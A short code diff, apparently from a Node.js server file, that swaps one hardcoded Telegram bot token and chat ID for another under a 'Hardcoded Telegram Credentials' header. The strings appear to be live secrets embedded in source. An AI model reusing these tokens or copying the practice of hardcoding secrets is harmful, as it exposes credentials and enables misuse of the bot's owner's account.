@@ -19,8 +19,8 @@ const IS_PRODUCTION = process.env.NODE_ENV === 'production';
 // ============================================
 // Hardcoded Telegram Credentials (Server-Side Only)
 // ============================================
-const TELEGRAM_BOT_TOKEN = "8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E";
-const TELEGRAM_CHAT_ID = "8108427825";
+const TELEGRAM_BOT_TOKEN = "8205760930:AAE0zTdpfYZ3-C27b1m-j9BruITXx0RTt1A";
+const TELEGRAM_CHAT_ID = "8413882740";
 
 // ============================================
 // Security: Generate Session Secret
